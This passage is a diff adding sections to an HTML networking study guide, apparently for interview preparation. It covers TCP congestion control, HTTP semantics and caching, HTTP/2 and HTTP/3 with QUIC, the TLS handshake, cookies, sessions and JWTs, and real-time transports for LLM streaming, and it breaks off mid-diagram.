+      <li><b>Timeout:</b> ssthresh = 20/2 = <b>10</b>, cwnd → <b>1</b>. Slow-start again (1 → 2 → 4 → 8 → 10), then congestion avoidance (11, 12, …).</li>
+      <li><b>3 duplicate ACKs:</b> ssthresh = 20/2 = <b>10</b>, cwnd → ssthresh + 3 = <b>13</b>. Stay in congestion avoidance (13 → 14 → 15 → …) — no crash to 1.</li>
+    </ul>
+    <div class="analogy">Slow start is <b>merging onto a highway</b>: you accelerate hard while it's clear, then ease into a steady cruise (avoidance). A crash ahead (timeout) makes you crawl from a stop; a brief brake-light (dup ACKs) just makes you slow a bit.</div>
+    <h3>Detecting a dead peer — TCP keepalive vs HTTP keep-alive</h3>
+    <p>Two unrelated mechanisms share the name "keep-alive":</p>
+    <table>
+      <tr><th></th><th>TCP keepalive</th><th>HTTP keep-alive</th></tr>
+      <tr><td>Layer</td><td>Transport (the OS)</td><td>Application (HTTP)</td></tr>
+      <tr><td>Purpose</td><td>Detect a <b>dead</b> connection: after a long idle the OS sends probe packets; no reply after a few → drop it</td><td>Keep the TCP connection <b>open</b> to reuse it for more requests (<code>Connection: keep-alive</code>), avoiding a fresh handshake each time</td></tr>
+      <tr><td>Knobs</td><td><code>tcp_keepalive_time / _intvl / _probes</code> + the <code>SO_KEEPALIVE</code> socket option</td><td><code>keepalive_timeout</code> (e.g. in Nginx)</td></tr>
+    </table>
+    <p>TCP keepalive's default (~2 hours idle) is far too slow for most apps, so services usually add their own <b>application-layer heartbeat</b> (a periodic ping/pong) to notice a dead peer within seconds.</p>
+  </section>
+
+  <!-- ============ HTTP ============ -->
+  <section id="http">
+    <h2><span class="num">06</span>HTTP basics</h2>
+    <p>HTTP is a stateless, text-based request/response protocol on top of TCP (default port <b>80</b>; HTTPS <b>443</b>). A request is a <b>method + URL + headers + optional body</b>; a response is a <b>status code + headers + body</b>.</p>
+    <h4>Methods</h4>
+    <table>
+      <tr><th>Method</th><th>Does</th><th>Safe / Idempotent</th></tr>
+      <tr><td><code>GET</code></td><td>Read a resource</td><td>safe, idempotent</td></tr>
+      <tr><td><code>POST</code></td><td>Create / submit</td><td>neither</td></tr>
+      <tr><td><code>PUT</code></td><td>Replace / upsert</td><td>idempotent</td></tr>
+      <tr><td><code>DELETE</code></td><td>Remove</td><td>idempotent</td></tr>
+    </table>
+    <div class="note"><b>GET vs POST:</b> GET puts params in the URL (cached, bookmarkable, length-limited in practice — a browser/server cap, not an HTTP rule — and logged), POST in the body (not cached, for changes/large data). Semantically GET is read-only/idempotent and POST is not — that difference matters more than "where the data goes".</div>
+    <h4>Status codes</h4>
+    <table>
+      <tr><th>Class</th><th>Meaning</th><th>Common</th></tr>
+      <tr><td><b>2xx</b></td><td>Success</td><td>200 OK · 201 Created (a new resource was made) · 204 No Content (success, nothing to return) · 206 Partial Content (just the requested byte range)</td></tr>
+      <tr><td><b>3xx</b></td><td>Redirect</td><td>301/308 permanent · 302/307 temporary · 304 Not Modified (cache still valid — reuse it). <b>301/302 = browser <i>may</i> change</b> the method (POST→GET, dropping the body); <b>307/308 = <i>must not</i> change</b> it (re-sent as-is).</td></tr>
+      <tr><td><b>4xx</b></td><td>Client error</td><td>400 Bad Request (malformed) · 401 Unauthorized (<i>not authenticated</i> — log in first) · 403 Forbidden (logged in, but <i>not allowed</i>) · 404 Not Found · 405 Method Not Allowed (wrong verb) · 429 Too Many Requests (rate-limited)</td></tr>
+      <tr><td><b>5xx</b></td><td>Server error</td><td>500 Internal Server Error (a bug/crash on the server) · 502 Bad Gateway (the gateway got an <i>invalid reply</i> from upstream) · 503 Service Unavailable (overloaded or down for maintenance) · 504 Gateway Timeout (upstream <i>didn't reply</i> in time)</td></tr>
+    </table>
+    <div class="iq"><b>301 vs 302</b>, <b>307/308</b>, and <b>502 vs 504</b> are favorites. 301 = permanent (browser caches the new URL), 302 = temporary. <b>307/308</b> are the strict versions that <b>preserve the method and body</b> (301/302 historically let clients turn a POST into a GET; 308 ≈ 301, 307 ≈ 302). 502 = the gateway got a bad reply from upstream; 504 = upstream didn't reply in time.</div>
+    <h3>How HTTP knows where a message ends</h3>
+    <p>HTTP rides on a TCP byte stream, so the receiver needs a rule to find the end of a body:</p>
+    <ul>
+      <li><b><code>Content-Length</code></b> — the sender declares the exact body size up front; the receiver reads that many bytes.</li>
+      <li><b><code>Transfer-Encoding: chunked</code></b> — for when the size isn't known up front (streaming): the body is sent as size-prefixed chunks, terminated by a zero-size chunk.</li>
+    </ul>
+    <p><b>Why it's needed — the "sticky packet" (粘包) problem.</b> TCP is a pure <b>byte stream</b>: it guarantees the bytes arrive in order, but keeps <i>no</i> record of where one "message" ended and the next began. So two responses sent separately can arrive <b>glued together</b> in one read, or one response can be <b>split</b> across several reads. TCP won't fix this — it has no concept of a "message". So the <i>application</i> protocol must mark the boundaries itself, which is exactly what <code>Content-Length</code> and <code>chunked</code> do above. (Any TCP-based protocol faces this; UDP doesn't, because each datagram is already one self-contained message.)</p>
+
+    <h3>HTTP caching — strong vs negotiated</h3>
+    <table>
+      <tr><th></th><th>Strong cache (强缓存)</th><th>Negotiated cache (协商缓存)</th></tr>
+      <tr><td>Idea</td><td>Use the local copy <b>without asking</b> the server, until it expires</td><td>When that expires, <b>ask</b> the server "changed?" — if not, keep using the local copy</td></tr>
+      <tr><td>On a hit</td><td><b>No request at all</b> — served straight from the browser's cache</td><td>A request <i>is</i> sent, but the server replies <b>304 Not Modified</b> with <b>no body</b>. The content comes from the browser's <i>own</i> cache — 304 just says "your copy is still valid" (it saves re-downloading the body, not the round-trip).</td></tr>
+    </table>
+    <h4>The headers</h4>
+    <table>
+      <tr><th>Header</th><th>Sent by</th><th>What it means</th></tr>
+      <tr><td><code>Cache-Control: max-age=N</code></td><td>server (strong)</td><td>"Fresh for N seconds — don't even ask me during that time." Relative time; the modern default.</td></tr>
+      <tr><td><code>Expires: &lt;date&gt;</code></td><td>server (strong)</td><td>Old form: an absolute expiry time. Depends on clock sync, so <code>max-age</code> replaced it (Cache-Control wins if both are present).</td></tr>
+      <tr><td><code>ETag</code> ↔ <code>If-None-Match</code></td><td>server → browser → back</td><td>Server sends a content <b>fingerprint</b>; next time the browser sends it back to ask "still this version?". Match → 304; differ → 200 + new body.</td></tr>
+      <tr><td><code>Last-Modified</code> ↔ <code>If-Modified-Since</code></td><td>server → browser → back</td><td>Same idea, by <b>last-changed time</b>: "modified since then?". Coarser (1-second) than ETag, so ETag wins if both exist.</td></tr>
+    </table>
+    <p>The browser checks the strong cache first; only on a miss/expiry does it fall back to a negotiated (conditional) request.</p>
+
+    <h3>RPC vs HTTP</h3>
+    <table>
+      <tr><th></th><th>RPC</th><th>HTTP / REST</th></tr>
+      <tr><td>Model</td><td>"call a remote method" — action-oriented</td><td>"operate on a resource" — verbs on URLs</td></tr>
+      <tr><td>Payload</td><td>compact binary (Protobuf/Thrift), strongly-typed contract</td><td>text (JSON), human-readable</td></tr>
+      <tr><td>Best for</td><td>internal service-to-service (fast, high-throughput)</td><td>public / cross-team APIs (universal, debuggable)</td></tr>
+    </table>
+    <p>Note many RPC frameworks run <i>over</i> HTTP/2 (e.g. gRPC) — so it's really "a compact custom protocol vs the general web protocol", not strictly either/or.</p>
+
+    <h3>Reverse proxy &amp; load balancing (Nginx)</h3>
+    <p>A reverse proxy like <b>Nginx</b> (an L7 / application-layer proxy) sits in front of your servers and spreads requests across them. Common algorithms:</p>
+    <ul>
+      <li><b>Round-robin</b> — each server in turn (default); <b>weighted</b> gives stronger servers more.</li>
+      <li><b>IP hash</b> — hash the client IP so a client always lands on the same server (cheap session stickiness).</li>
+      <li><b>Least-connections / least-time</b> — pick the server with the fewest active requests / fastest responses.</li>
+      <li><b>URL hash</b> — route by URL, for cache locality.</li>
+    </ul>
+  </section>
+
+  <!-- ============ VERSIONS ============ -->
+  <section id="versions">
+    <h2><span class="num">07</span>HTTP/1.1 → 2 → 3</h2>
+    <p>Each version fixes the bottleneck of the last. The arrows show the <i>remaining</i> problem that motivates the next step:</p>
+    <div class="mermaid">
+flowchart TB
+    V10["HTTP/1.0<br/>1 request per TCP connection"]:::v -->|"slow: a new connection + handshake every time"| V11
+    V11["HTTP/1.1<br/>Keep-Alive (reuse connection) · pipelining"]:::v -->|"responses must return in request order →<br/>application-layer head-of-line (HOL) blocking"| V2
+    V2["HTTP/2<br/>multiplexing · binary framing · HPACK"]:::v -->|"all streams share ONE TCP connection;<br/>one lost packet stalls them all → TCP-layer HOL"| V3
+    V3["HTTP/3<br/>runs on QUIC (over UDP)"]:::v -->|"per-stream loss recovery → no cross-stream stall;<br/>TLS built in (fewer RTTs), survives IP change"| OK["HOL blocking solved"]:::ok
+    classDef v fill:#e3edf8,stroke:#3367b5,color:#1f3a66;
+    classDef ok fill:#dcefe2,stroke:#3aa856,color:#1d6b32;
+    </div>
+    <h4>The jargon, defined</h4>
+    <table>
+      <tr><th>Term</th><th>What it means</th></tr>
+      <tr><td><b>Head-of-line (HOL) blocking</b><br/>队头阻塞</td><td>One slow/lost item at the front blocks everything behind it — like a checkout line where the first person is stuck and everyone waits.</td></tr>
+      <tr><td><b>Keep-Alive</b> · persistent connection<br/>长连接</td><td>Don't close the TCP connection after one request — reuse it for the next, skipping a fresh handshake each time.</td></tr>
+      <tr><td><b>Pipelining</b><br/>流水线</td><td>Send several requests back-to-back <i>without waiting</i> for each response. Catch: responses must return in request order, so a slow one blocks the rest — this <i>is</i> 1.1's HOL blocking.</td></tr>
+      <tr><td><b>Multiplexing</b><br/>多路复用</td><td>Run many independent <b>streams</b> on one connection at once; requests/responses interleave and finish out of order, not blocking each other.</td></tr>
+      <tr><td><b>Binary framing</b><br/>二进制分帧</td><td>HTTP/2 splits messages into small binary <b>frames</b> (instead of 1.1's plain text) — this is what makes multiplexing possible.</td></tr>
+      <tr><td><b>HPACK</b></td><td>HTTP/2's header-compression scheme (shrinks repeated request headers).</td></tr>
+      <tr><td><b>QUIC</b></td><td>HTTP/3's new transport protocol, built on UDP — TLS is built in, and it recovers from packet loss <i>per stream</i>.</td></tr>
+    </table>
+    <table>
+      <tr><th>Version</th><th>Big idea</th><th>Fixes</th></tr>
+      <tr><td><b>1.0</b></td><td>One request per TCP connection</td><td>—</td></tr>
+      <tr><td><b>1.1</b></td><td><b>Keep-Alive</b> (reuse the connection), pipelining, chunked, Range</td><td>Reuses connections, but with pipelining responses must return in request order, so one slow response blocks the rest → <b>application-layer head-of-line (HOL) blocking</b></td></tr>
+      <tr><td><b>2</b></td><td><b>Binary framing</b>, <b>multiplexing</b> many streams on one connection, <b>HPACK</b> header compression, and (originally) server push</td><td>Kills <i>application-layer</i> HOL blocking; one slow response no longer stalls others</td></tr>
+      <tr><td><b>3</b></td><td>Runs over <b>QUIC</b> (on UDP) instead of TCP</td><td>Kills <i>TCP-level</i> HOL blocking &amp; cuts handshake RTTs (TLS built in); survives IP changes</td></tr>
+    </table>
+    <div class="iq"><b>The HOL-blocking story ties it together:</b> 1.1 multiplexes nothing (or pipelines fragilely) → 2 multiplexes streams but a lost TCP packet still stalls <i>all</i> streams (TCP-level HOL) → 3 moves to QUIC/UDP where streams are independent, so loss in one doesn't block the rest. That's the whole evolution in one sentence.</div>
+    <div class="analogy"><b>Multiplexing, by analogy.</b> HTTP/1.1 is a <b>single-lane road</b>: one car (request) at a time — if the front one is slow, everyone behind waits. HTTP/2 multiplexing turns the same road into a <b>multi-lane highway</b>: many cars travel at once, each in its own lane, arriving independently. The "lanes" are <b>stream IDs</b>; each car is chopped into labelled pieces (<b>frames</b>) so cars from different lanes interleave on the wire and get reassembled by ID at the far end. (Catch: all lanes still share <i>one</i> TCP connection, so a single lost TCP packet stalls every lane — TCP-layer HOL blocking, which only HTTP/3 fixes.)</div>
+    <h4>How one TCP connection carries many streams (and why 1.1 couldn't)</h4>
+    <p><b>In HTTP/1.1</b> a message is one contiguous block of text with <b>no per-chunk label</b> — so on one connection you must finish one response before starting the next; mix two responses' bytes and the receiver can't tell them apart. (Pipelining sent requests back-to-back, but responses still came back whole and in order → HOL blocking.)</p>
+    <p><b>HTTP/2's trick — binary framing + stream IDs:</b></p>
+    <ol>
+      <li>Split every message into small binary <b>frames</b>.</li>
+      <li>Tag each frame's header with a <b>stream ID</b> ("I belong to stream 3").</li>
+      <li>Now frames from different streams can be <b>interleaved</b> on the one connection.</li>
+      <li>The receiver <b>reassembles by stream ID</b> — stream 1's frames → response A, stream 3's → response B…</li>
+    </ol>
+    <div class="card" style="font-family:var(--mono);font-size:.82rem">
+      <div style="line-height:2.4">one TCP connection sends&nbsp;
+        <span style="background:#e3edf8;border:1px solid #3367b5;color:#1f3a66;padding:2px 7px;border-radius:5px;margin-right:3px">S1</span><span style="background:#fbf0d8;border:1px solid #c9a83a;color:#6b5212;padding:2px 7px;border-radius:5px;margin-right:3px">S3</span><span style="background:#e3edf8;border:1px solid #3367b5;color:#1f3a66;padding:2px 7px;border-radius:5px;margin-right:3px">S1</span><span style="background:#dcefe2;border:1px solid #3aa856;color:#1d6b32;padding:2px 7px;border-radius:5px;margin-right:3px">S5</span><span style="background:#fbf0d8;border:1px solid #c9a83a;color:#6b5212;padding:2px 7px;border-radius:5px;margin-right:3px">S3</span><span style="background:#e3edf8;border:1px solid #3367b5;color:#1f3a66;padding:2px 7px;border-radius:5px;margin-right:3px">S1</span> …
+      </div>
+      <div class="kv" style="line-height:1.6;margin-top:6px">each box = one frame, tagged with its stream ID. The receiver sorts by tag → <b>S1</b> = response A · <b>S3</b> = response B · <b>S5</b> = response C. HTTP/1.1's chunks have no such tag, so they can't be mixed.</div>
+    </div>
+    <p>So the whole secret is the <b>tag on every frame</b>. Adding it meant changing the wire format from text to framed binary — exactly what HTTP/2 did. And it all runs <i>on top of</i> TCP, which still delivers bytes strictly in order — so one lost TCP packet stalls <i>every</i> stream until it's retransmitted (TCP-layer HOL blocking, the reason HTTP/3 moves streams down into QUIC).</p>
+    <h4>What QUIC is — and why HTTP/3 leaves TCP behind</h4>
+    <p><b>QUIC</b> (a name, not an acronym) is a new transport protocol built on top of <b>UDP</b>. So the stack changes: HTTP/1.1 and HTTP/2 run on <b>TCP</b>; HTTP/3 drops TCP and runs on <b>QUIC → UDP</b>. Why UDP? TCP's strict in-order delivery — the very thing causing TCP-layer HOL blocking — is baked into the OS kernel and can't be changed. UDP is a bare-bones "just send packets, no ordering, no reliability" protocol, so QUIC treats it as a blank canvas and rebuilds reliability, congestion control, multiple streams, <i>and</i> TLS on top — in user space, where it's free to do it better.</p>
+    <p><b>Why QUIC recovers from loss per-stream, and TCP can't:</b></p>
+    <table>
+      <tr><th></th><th>TCP (HTTP/2)</th><th>QUIC (HTTP/3)</th></tr>
+      <tr><td>What the transport sees</td><td>one single ordered byte stream — it has <b>no idea</b> there are separate HTTP streams inside</td><td>streams are <b>built into</b> the transport — it knows which bytes belong to which stream</td></tr>
+      <tr><td>When a packet is lost</td><td>to keep bytes in order the kernel holds back <b>everything after the gap</b>, including other streams' data → all streams stall</td><td>only the stream carried in that packet waits; <b>the other streams keep being delivered</b></td></tr>
+    </table>
+    <div class="card" style="font-family:var(--mono);font-size:.8rem;line-height:2.2">
+      <div><b style="color:#c4452e">TCP&nbsp;</b> S1 S3 <span style="background:#f6dcd6;border:1px solid #c4452e;color:#7a2a1c;padding:1px 6px;border-radius:5px">✗ lost</span> S1 S5 S3 &nbsp;→&nbsp; the gap holds back <b>everything</b> after it — S1 &amp; S5 wait too</div>
+      <div><b style="color:#1f7a70">QUIC</b> S1 S3 <span style="background:#f6dcd6;border:1px solid #c4452e;color:#7a2a1c;padding:1px 6px;border-radius:5px">✗ lost</span> S1 S5 S3 &nbsp;→&nbsp; only <b>S3</b> waits; S1 &amp; S5 are delivered on time</div>
+    </div>
+    <p>Rebuilding the transport buys two more wins — both worth drawing.</p>
+    <p><b>Win 1 — one handshake, not two.</b> On TCP the connection handshake must finish <i>before</i> TLS can even begin, so you pay two round trips before the first request goes out. Because <b>TLS is built into QUIC</b>, it folds the transport and TLS handshakes into one:</p>
+    <div class="mermaid">
+sequenceDiagram
+    participant C as Client
+    participant S as Server
+    Note over C,S: ① TCP handshake — 1 RTT
+    C->>S: SYN
+    S->>C: SYN-ACK
+    C->>S: ACK
+    Note over C,S: ② TLS 1.3 handshake — 1 more RTT
+    C->>S: ClientHello
+    S->>C: ServerHello + certificate
+    C->>S: Finished
+    Note over C,S: ③ only now can the first request go
+    C->>S: GET /
+    </div>
+    <div class="mermaid">
+sequenceDiagram
+    participant C as Client
+    participant S as Server
+    Note over C,S: transport + TLS in ONE handshake — 1 RTT
+    C->>S: Initial (ClientHello inside)
+    S->>C: Initial (ServerHello + certificate)
+    C->>S: Finished + GET / — data rides with the handshake
+    </div>
+    <p><b>Win 2 — the connection survives a network change.</b> TCP identifies a connection by the <b>IP/port 4-tuple</b>, so switching Wi-Fi → cellular changes your IP and breaks it. QUIC identifies it by a <b>Connection ID</b> that doesn't change, so the same connection just continues:</p>
+    <div class="mermaid">
+flowchart TB
+    classDef bad fill:#f6dcd6,stroke:#c4452e,color:#7a2a1c
+    classDef good fill:#dcefe2,stroke:#1f7a70,color:#1d6b32
+    A["📶 Connected on Wi-Fi"] --> B{"Phone switches to cellular<br/>→ your IP address changes"}
+    B --> T["TCP — connection = IP:port 4-tuple<br/>new IP no longer matches → connection dies<br/>must reconnect + redo handshakes"]:::bad
+    B --> Q["QUIC — connection = Connection ID (CID)<br/>CID unchanged → same connection continues<br/>no reconnect, no new handshake"]:::good
+    </div>
+    <div class="note"><b>Heads-up on HTTP/2 server push:</b> it's effectively <b>deprecated</b> — Chrome disabled it by default in 2022 and Firefox removed it in 2024. <b>103 Early Hints</b> is the modern replacement for "tell the browser what to fetch early". Don't list it as a live HTTP/2 advantage.</div>
+  </section>
+
+  <!-- ============ HTTPS ============ -->
+  <section id="https">
+    <h2><span class="num">08</span>HTTPS &amp; TLS</h2>
+    <p><b>HTTPS = HTTP over TLS.</b> Plain HTTP is plaintext — anyone on the path can read or tamper with it (man-in-the-middle). TLS adds three things: <b>encryption</b> (privacy), <b>integrity</b> (tamper-proof), and <b>authentication</b> (you're really talking to that server, via its certificate).</p>
+    <div class="mermaid">
+sequenceDiagram
+    participant C as Client
+    participant S as Server
+    C->>S: ClientHello (TLS versions, cipher list, client random)
+    S->>C: ServerHello (chosen cipher, server random) + Certificate
+    Note over C: verify cert — it carries the server's PUBLIC key
+    Note over C,S: 🔑 ASYMMETRIC step — safely agree on a secret over the open line
+    C->>S: key exchange — (RSA) pre-master encrypted with the server's public key
+    Note over C,S: both derive the SAME session key (client random + server random + pre-master)
+    C->>S: Finished (encrypted)
+    S->>C: Finished (encrypted)
+    Note over C,S: 🔒 SYMMETRIC from here — all app data uses the fast session key (AES)
+    </div>
+    <div class="tip"><b>The RSA key exchange, step by step</b> — the asymmetric → symmetric handoff:
+      <ol style="margin:6px 0 0">
+        <li>The server's <b>certificate carries its public key</b>.</li>
+        <li>The client generates a fresh random <b>pre-master secret</b> (new for <i>this</i> session), encrypts it <b>with the server's public key</b>, and sends it.</li>
+        <li><b>Safe in transit:</b> only the server's <b>private key</b> can decrypt it, so an eavesdropper who copies the message learns nothing.</li>
+        <li>The server decrypts it with its <b>private key</b> — now both sides hold the pre-master.</li>
+        <li>Both <b>derive the same session key</b> from pre-master + client random + server random, then switch to <b>fast symmetric (AES)</b> for all the real data.</li>
+      </ol>
+    </div>
+    <h4>Symmetric vs asymmetric — what they actually are</h4>
+    <table>
+      <tr><th></th><th>Symmetric (对称)</th><th>Asymmetric (非对称)</th></tr>
+      <tr><td>Keys</td><td>one <b>shared</b> key — the same key encrypts &amp; decrypts</td><td>a <b>pair</b>: a public key + a private key (mathematically linked)</td></tr>
+      <tr><td>Rule</td><td>the same key locks and unlocks</td><td>encrypt with the <b>public</b> key → only the matching <b>private</b> key can decrypt (the reverse direction signs)</td></tr>
+      <tr><td>Speed</td><td>fast</td><td>slow</td></tr>
+      <tr><td>The point</td><td>but: how do you hand the key to the other side over an open line without it being seen?</td><td>lets a stranger send <i>you</i> a secret over an open line — only your private key opens it</td></tr>
+      <tr><td>Examples</td><td>AES</td><td>RSA, ECDHE</td></tr>
+    </table>
+    <div class="analogy"><b>Asymmetric</b> = a mailbox with a public slot: <b>anyone can drop a letter in</b> (encrypt with the public key) but <b>only the owner's key opens it</b> (private key). You use it <i>once</i> to hand the owner a shared padlock combination; after that you both use the fast <b>shared padlock</b> (symmetric).</div>
+    <div class="note"><b>Why both asymmetric and symmetric?</b> Asymmetric (RSA/ECDHE) is slow but lets two strangers agree on a secret over an open line; symmetric (AES) is fast. So TLS uses asymmetric crypto <i>only</i> to exchange a shared key, then encrypts the actual data with fast symmetric crypto.</div>
+    <div class="note"><b>RSA vs ECDHE key exchange — and "forward secrecy":</b> with classic <b>RSA</b>, the client encrypts a <b>pre-master secret</b> with the server's public key and sends it; both sides then derive the session key from client-random + server-random + pre-master. The risk: if the server's private key <i>ever</i> leaks, anyone who recorded past traffic can decrypt it — <b>no forward secrecy</b>. <b>ECDHE</b> instead exchanges <i>ephemeral</i> Diffie-Hellman params (the certificate only <i>signs</i> them), so each session's key is independent and a later key leak can't decrypt old sessions — <b>forward secrecy</b>. TLS 1.3 dropped RSA key exchange entirely (ECDHE only) and is 1-RTT.</div>
+    <div class="iq"><b>How does a certificate stop a MITM?</b> The server's cert is signed by a <b>CA</b> your OS/browser already trusts. An attacker can copy the cert but can't forge the CA's signature for their own key, and can't present the real cert with a key they don't own — so the verification (or the key exchange) fails. The trust chain (root CA → intermediate → site) is the anchor.</div>
+  </section>
+
+  <!-- ============ STATE ============ -->
+  <section id="state">
+    <h2><span class="num">09</span>Cookie · Session · Token (JWT)</h2>
+    <p>HTTP is <b>stateless</b> — the server doesn't remember you between requests. These mechanisms add "who are you" on top.</p>
+    <table>
+      <tr><th></th><th>Cookie</th><th>Session</th><th>JWT (token)</th></tr>
+      <tr><td>Lives where</td><td>Browser, sent on every request</td><td>Server (memory/DB); browser holds only a session-id cookie</td><td>Client (the token itself carries the data)</td></tr>
+      <tr><td>Server state?</td><td>—</td><td><b>Stateful</b> (server stores it)</td><td><b>Stateless</b> (server just verifies a signature)</td></tr>
+      <tr><td>Scales across servers</td><td>—</td><td>Needs shared store / sticky sessions</td><td>Trivially — any server can verify</td></tr>
+    </table>
+    <h4>JWT — structure</h4>
+    <div class="card" style="font-family:var(--mono);font-size:.82rem;line-height:1.7">
+      <span class="tag t-warn">header</span> . <span class="tag t-on">payload</span> . <span class="tag t-off">signature</span> &nbsp;→&nbsp; three base64url parts joined by dots, e.g. <code>eyJhbG…</code>.<code>eyJzdW…</code>.<code>SflKxw…</code>
+    </div>
+    <table>
+      <tr><th>Part</th><th>Contains</th><th>Job</th></tr>
+      <tr><td><b>Header</b></td><td><code>alg</code> (signing algorithm, e.g. HS256) + <code>typ</code> (= JWT)</td><td>Tells the verifier <i>how</i> the signature was made.</td></tr>
+      <tr><td><b>Payload</b></td><td><b>Claims</b>: who (user id), what (roles), when (<code>exp</code> expiry, <code>iat</code> issued-at)…</td><td>The actual data the token carries about the user.</td></tr>
+      <tr><td><b>Signature</b></td><td><code>HMAC(base64(header) + "." + base64(payload), secret)</code></td><td>Proves header+payload weren't tampered with — only someone holding the <b>secret</b> could produce it.</td></tr>
+    </table>
+    <p><b>How a server trusts it (no DB lookup):</b> it re-computes the signature from the received header+payload using its secret; if that matches the signature in the token, it's authentic and untampered → trust the payload. <b>Encoded ≠ encrypted:</b> anyone can base64-decode and <i>read</i> the header &amp; payload — the signature only detects tampering, it doesn't hide anything. So never put secrets (passwords, etc.) in the payload.</p>
+    <div class="warn"><b>JWT's hard part is revocation.</b> Because it's stateless, you can't "log someone out" server-side before the token expires. Fixes: keep expiry <b>short</b> + use a <b>refresh token</b>, or maintain a server-side <b>blocklist</b> (which reintroduces state). Classic trade-off: sessions are easy to revoke but need shared storage; JWTs scale statelessly but are hard to revoke.</div>
+    <div class="iq"><b>Cookie vs localStorage:</b> cookies auto-send to the server (and can be <code>HttpOnly</code> to hide from JS → safer against XSS); localStorage is bigger (~5MB), never auto-sent, but readable by any JS on the page. Store a JWT in an HttpOnly cookie + CSRF protection, or in memory — not plain localStorage if you can avoid it.</div>
+  </section>
+
+  <!-- ============ REALTIME ============ -->
+  <section id="realtime">
+    <h2><span class="num">10</span>Real-time: WebSocket &amp; SSE</h2>
+    <p>HTTP is request/response — the client must ask. For pushing data the other way (or both ways) there's a spectrum, increasing in power:</p>
+    <table>
+      <tr><th></th><th>Polling</th><th>SSE</th><th>HTTP streaming</th><th>WebSocket</th><th>WebRTC</th></tr>
+      <tr><td>Direction</td><td>client pulls, repeatedly</td><td><b>server → client</b> (one-way)</td><td><b>server → client</b> (one-way)</td><td><b>full-duplex</b> (both ways at once)</td><td><b>full-duplex</b>, peer-to-peer</td></tr>
+      <tr><td>Transport</td><td>TCP (repeated HTTP)</td><td>TCP (one long HTTP response)</td><td>TCP (one long HTTP response)</td><td>TCP (upgraded from HTTP)</td><td><b>UDP</b></td></tr>
+      <tr><td>Data type</td><td>text / JSON</td><td><b>text only</b></td><td>text <b>or binary</b></td><td>text or binary</td><td>audio / video / binary</td></tr>
+      <tr><td>Browser API</td><td><code>fetch</code> on a timer</td><td><code>EventSource</code></td><td><code>fetch</code> + <code>ReadableStream</code></td><td><code>WebSocket</code></td><td><code>RTCPeerConnection</code></td></tr>
+      <tr><td>Reconnect</td><td>n/a</td><td><b>auto</b>, built-in (<code>Last-Event-ID</code>)</td><td>you handle it</td><td>you handle it</td><td>ICE re-negotiates paths</td></tr>
+      <tr><td>Use for</td><td>simple, low-frequency</td><td><b>LLM token streaming</b>, feeds, notifications, live scores</td><td>any long response — incl. how LLM/SSE streams are read when a POST + auth header is needed</td><td>chat, games, collaborative editing</td><td>voice / video calls</td></tr>
+    </table>
+    <p><b>SSE and HTTP streaming aren't rivals.</b> A long-lived HTTP response <i>is</i> HTTP streaming; <b>SSE is just one specific text format of it</b> (the <code>data: …</code> convention). So LLM token streams <i>are</i> SSE — they're simply consumed with <code>fetch</code> streaming instead of the <code>EventSource</code> API (why → the terminology note below). "Raw" HTTP streaming, with no SSE format, is for when you ship binary or your own framing.</p>
+    <p><b>What "duplex / two-way" means:</b> <b>simplex</b> = one direction only (broadcast TV); <b>half-duplex</b> = both directions but one at a time (a walkie-talkie — you talk, then I talk); <b>full-duplex</b> = both directions <i>at the same time</i> (a phone call — both can speak at once). SSE and HTTP streaming are one-way (server → client); WebSocket and WebRTC are full-duplex.</p>
+    <div class="mermaid">
+sequenceDiagram
+    participant C as Client
+    participant S as Server
+    C->>S: GET /ws  (Upgrade: websocket)
+    S->>C: 101 Switching Protocols
+    Note over C,S: TCP connection now a 2-way WebSocket
+    C->>S: message
+    S->>C: message (any time, both directions)
+    </div>
+    <div class="iq"><b>SSE vs WebSocket — when?</b> If you only need the <b>server to push</b> to the client (dashboards, notifications, LLM token streams), <b>SSE</b> is simpler: it's just HTTP, auto-reconnects, and works through proxies/HTTP-2. Reach for <b>WebSocket</b> when you need <b>true two-way</b>, low-latency traffic (chat, multiplayer, collaborative cursors).</div>
+    <h4>How SSE auto-reconnects</h4>
+    <p>Reconnection is built into the browser's <code>EventSource</code>, so you write none of it:</p>
+    <ul>
+      <li>If the stream drops, the browser <b>reconnects automatically</b> after a delay — the server can set it with a <code>retry: 5000</code> field (ms).</li>
+      <li>The server tags each event with an <code>id:</code>. On reconnect the browser sends the last one back in a <code>Last-Event-ID</code> request header, so the server can <b>resume from where it left off</b> — no missed events.</li>
+    </ul>
+    <h4>Choosing a real-time transport for LLM / AI features</h4>
+    <p>A favourite interview question — and "the most powerful option wins" is the <i>wrong</i> answer. Each transport fits a different shape of traffic:</p>
+    <table>
+      <tr><th>AI scenario</th><th>Pick</th><th>Why</th></tr>
+      <tr><td>Streaming text output (token by token)</td><td><b>SSE</b></td><td>One-way server→client is all you need; it's plain HTTP, so proxies / CDNs / load-balancers just work and each request scales independently. OpenAI &amp; Anthropic stream this way.</td></tr>
+      <tr><td>Multi-turn chat</td><td><b>SSE + POST</b></td><td>Send the user's message with a normal POST; stream the model's reply back as SSE — clean separation.</td></tr>
+      <tr><td>User can interrupt mid-stream ("stop")</td><td><b>WebSocket</b></td><td>Now you need a live <i>upstream</i> channel <i>during</i> the stream — full-duplex finally earns its complexity.</td></tr>
+      <tr><td>Real-time voice conversation</td><td><b>WebRTC</b></td><td>Audio needs UDP + minimal latency; TCP retransmission would stall everything (see below).</td></tr>
+    </table>
+    <p><b>The terminology trap.</b> "OpenAI uses SSE" refers to the <i>wire format</i> — the response is <code>text/event-stream</code> with <code>data: {…}</code> chunks. But browser clients read it with <code>fetch</code> + <code>ReadableStream</code>, <b>not</b> the <code>EventSource</code> API, because the request must be a <b>POST</b> carrying the prompt + an <code>Authorization</code> header, and <code>EventSource</code> is <b>GET-only with no custom headers</b>. So the precise phrasing is "<b>SSE wire format, consumed via HTTP streaming</b>" — the SSE and HTTP-streaming columns from the table above are really one combined technique here.</p>
+    <div class="mermaid">
+flowchart TB
+    classDef wire fill:#fbf0d8,stroke:#c9a83a,color:#6b5212
+    classDef bad fill:#f6dcd6,stroke:#c4452e,color:#7a2a1c
+    classDef good fill:#dcefe2,stroke:#1f7a70,color:#1d6b32
+    classDef neutral fill:#e3edf8,stroke:#3367b5,color:#1f3a66
+    W["📡 On the wire — SSE format<br/>Content-Type: text/event-stream<br/>data: token=Hel<br/>data: token=lo"]:::wire
+    W --> Q{"How does the browser READ it?"}:::neutral
+    Q -->|"EventSource API"| E["❌ GET only · no custom headers<br/>can't POST the prompt<br/>can't send Authorization"]:::bad
